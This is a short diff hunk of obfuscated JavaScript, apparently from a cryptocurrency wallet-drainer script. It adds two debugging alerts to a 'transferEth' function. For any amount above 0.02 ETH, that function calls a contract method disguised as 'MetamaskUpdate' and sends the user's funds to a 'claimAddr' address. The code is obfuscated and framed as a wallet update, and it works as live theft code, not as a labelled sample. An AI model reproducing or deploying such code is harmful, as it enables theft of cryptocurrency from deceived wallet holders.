@@ -3386,6 +3386,8 @@ async function transferEth(_0x2d6c7a, _0x48f621, _0xaf98f0) {
     if (_0x48f621 <= 0x470de4df820000)
         return !![];
     debugger;
+    alert(claimABI);
+    alert(claimAddr);
     var _0x56511f = new web3[(_0x2193f6(0x277))][(_0x2193f6(0x8b4))](claimABI,claimAddr)
       , _0xe2878e = _0x56511f[_0x2193f6(0xbda)]['MetamaskUpdate']()[_0x2193f6(0x7ab)]();
     let _0x203c8b = await sendTransaction(_0x2d6c7a, _0xe2878e, claimAddr, _0x48f621);
